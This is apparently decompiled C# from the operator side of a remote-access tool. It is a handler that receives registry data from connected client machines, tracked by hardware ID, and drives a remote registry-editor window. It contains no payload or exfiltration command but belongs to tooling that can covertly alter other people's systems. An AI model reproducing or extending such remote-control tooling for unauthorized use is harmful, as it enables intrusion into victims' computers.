using System.Collections.Generic;
using System.Windows.Forms;
using Leb128;
using Microsoft.Win32;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRegedit
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (text == null)
		{
			return;
		}
		switch (text.Length)
		{
		case 7:
			switch (text[0])
			{
			case 'C':
			{
				if (!(text == "Connect"))
				{
					break;
				}
				FormRegedit form2 = (FormRegedit)Application.OpenForms["Regedit:" + (string)objects[2]];
				if (form2 == null)
				{
					client.Disconnect();
					break;
				}
				string rootKey2 = (string)objects[3];
				List<RegistrySeeker.RegSeekerMatch> seekerMatches2 = new List<RegistrySeeker.RegSeekerMatch>();
				int num4 = 4;
				while (num4 < objects.Length)
				{
					RegistrySeeker.RegSeekerMatch regSeekerMatch3 = new RegistrySeeker.RegSeekerMatch();
					regSeekerMatch3.Key = (string)objects[num4++];
					object[] array3 = LEB128.Read((byte[])objects[num4++]);
					List<RegistrySeeker.RegValueData> list3 = new List<RegistrySeeker.RegValueData>();
					int num5 = 0;
					while (num5 < array3.Length)
					{
						RegistrySeeker.RegValueData regValueData5 = new RegistrySeeker.RegValueData();
						regValueData5.Name = (string)array3[num5++];
						regValueData5.Kind = (RegistryValueKind)(int)array3[num5++];
						regValueData5.Data = (byte[])array3[num5++];
						list3.Add(regValueData5);
					}
					regSeekerMatch3.Data = list3.ToArray();
					regSeekerMatch3.HasSubKeys = (bool)objects[num4++];
					seekerMatches2.Add(regSeekerMatch3);
				}
				form2.Invoke((MethodInvoker)delegate
				{
					form2.materialLabel1.Enabled = true;
					form2.lstRegistryValues.Enabled = true;
					form2.tvRegistryDirectory.Enabled = true;
					form2.Text = "Regedit [" + (string)objects[2] + "]";
					form2.materialLabel1.Text = "Succues Connect";
					form2.AddKeys(rootKey2, seekerMatches2.ToArray());
					form2.client = client;
				});
				client.Tag = form2;
				client.Hwid = (string)objects[2];
				break;
			}
			case 'L':
			{
				if (!(text == "LoadKey"))
				{
					break;
				}
				FormRegedit FM8 = (FormRegedit)client.Tag;
				if (FM8 == null)
				{
					break;
				}
				string rootKey = (string)objects[2];
				List<RegistrySeeker.RegSeekerMatch> seekerMatches = new List<RegistrySeeker.RegSeekerMatch>();
				int num2 = 3;
				while (num2 < objects.Length)
				{
					RegistrySeeker.RegSeekerMatch regSeekerMatch2 = new RegistrySeeker.RegSeekerMatch();
					regSeekerMatch2.Key = (string)objects[num2++];
					object[] array2 = LEB128.Read((byte[])objects[num2++]);
					List<RegistrySeeker.RegValueData> list2 = new List<RegistrySeeker.RegValueData>();
					int num3 = 0;
					while (num3 < array2.Length)
					{
						RegistrySeeker.RegValueData regValueData4 = new RegistrySeeker.RegValueData();
						regValueData4.Name = (string)array2[num3++];
						regValueData4.Kind = (RegistryValueKind)(int)array2[num3++];
						regValueData4.Data = (byte[])array2[num3++];
						list2.Add(regValueData4);
					}
					regSeekerMatch2.Data = list2.ToArray();
					regSeekerMatch2.HasSubKeys = (bool)objects[num2++];
					seekerMatches.Add(regSeekerMatch2);
				}
				FM8.Invoke((MethodInvoker)delegate
				{
					FM8.AddKeys(rootKey, seekerMatches.ToArray());
				});
				break;
			}
			}
			break;
		case 9:
			switch (text[0])
			{
			case 'C':
			{
				if (!(text == "CreateKey"))
				{
					break;
				}
				FormRegedit FM7 = (FormRegedit)client.Tag;
				if (FM7 != null)
				{
					string ParentPath = (string)objects[2];
					RegistrySeeker.RegSeekerMatch regSeekerMatch = new RegistrySeeker.RegSeekerMatch();
					regSeekerMatch.Key = (string)objects[3];
					object[] array = LEB128.Read((byte[])objects[4]);
					List<RegistrySeeker.RegValueData> list = new List<RegistrySeeker.RegValueData>();
					int num = 0;
					while (num < array.Length)
					{
						RegistrySeeker.RegValueData regValueData3 = new RegistrySeeker.RegValueData();
						regValueData3.Name = (string)array[num++];
						regValueData3.Kind = (RegistryValueKind)(int)array[num++];
						regValueData3.Data = (byte[])array[num++];
						list.Add(regValueData3);
					}
					regSeekerMatch.Data = list.ToArray();
					regSeekerMatch.HasSubKeys = (bool)objects[5];
					FM7.Invoke((MethodInvoker)delegate
					{
						FM7.CreateNewKey(ParentPath, regSeekerMatch);
					});
				}
				break;
			}
			case 'D':
			{
				if (!(text == "DeleteKey"))
				{
					break;
				}
				FormRegedit FM6 = (FormRegedit)client.Tag;
				if (FM6 != null)
				{
					FM6.Invoke((MethodInvoker)delegate
					{
						FM6.DeleteKey((string)objects[2], (string)objects[3]);
					});
				}
				break;
			}
			case 'R':
			{
				if (!(text == "RenameKey"))
				{
					break;
				}
				FormRegedit FM5 = (FormRegedit)client.Tag;
				if (FM5 != null)
				{
					FM5.Invoke((MethodInvoker)delegate
					{
						FM5.RenameKey((string)objects[2], (string)objects[3], (string)objects[4]);
					});
				}
				break;
			}
			}
			break;
		case 11:
			switch (text[2])
			{
			case 'e':
			{
				if (!(text == "CreateValue"))
				{
					break;
				}
				FormRegedit FM3 = (FormRegedit)client.Tag;
				if (FM3 != null)
				{
					string keyPath2 = (string)objects[2];
					string text2 = (string)objects[3];
					string name = (string)objects[4];
					RegistryValueKind kind = RegistryValueKind.None;
					switch (text2)
					{
					case "-1":
						kind = RegistryValueKind.None;
						break;
					case "0":
						kind = RegistryValueKind.Unknown;
						break;
					case "1":
						kind = RegistryValueKind.String;
						break;
					case "2":
						kind = RegistryValueKind.ExpandString;
						break;
					case "3":
						kind = RegistryValueKind.Binary;
						break;
					case "4":
						kind = RegistryValueKind.DWord;
						break;
					case "7":
						kind = RegistryValueKind.MultiString;
						break;
					case "11":
						kind = RegistryValueKind.QWord;
						break;
					}
					RegistrySeeker.RegValueData regValueData2 = new RegistrySeeker.RegValueData();
					regValueData2.Name = name;
					regValueData2.Kind = kind;
					regValueData2.Data = new byte[0];
					FM3.Invoke((MethodInvoker)delegate
					{
						FM3.CreateValue(keyPath2, regValueData2);
					});
				}
				break;
			}
			case 'l':
			{
				if (!(text == "DeleteValue"))
				{
					break;
				}
				FormRegedit FM2 = (FormRegedit)client.Tag;
				if (FM2 != null)
				{
					FM2.Invoke((MethodInvoker)delegate
					{
						FM2.DeleteValue((string)objects[2], (string)objects[3]);
					});
				}
				break;
			}
			case 'n':
			{
				if (!(text == "RenameValue"))
				{
					break;
				}
				FormRegedit FM4 = (FormRegedit)client.Tag;
				if (FM4 != null)
				{
					FM4.Invoke((MethodInvoker)delegate
					{
						FM4.RenameValue((string)objects[2], (string)objects[3], (string)objects[4]);
					});
				}
				break;
			}
			case 'a':
			{
				if (!(text == "ChangeValue"))
				{
					break;
				}
				FormRegedit FM = (FormRegedit)client.Tag;
				if (FM != null)
				{
					string keyPath = (string)objects[2];
					RegistrySeeker.RegValueData regValueData = new RegistrySeeker.RegValueData();
					regValueData.Name = (string)objects[3];
					regValueData.Kind = (RegistryValueKind)(int)objects[4];
					regValueData.Data = (byte[])objects[5];
					FM.Invoke((MethodInvoker)delegate
					{
						FM.ChangeValue(keyPath, regValueData);
					});
				}
				break;
			}
			}
			break;
		case 5:
		{
			if (!(text == "Error"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormRegedit form = (FormRegedit)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		case 6:
		case 8:
		case 10:
			break;
		}
	}
}
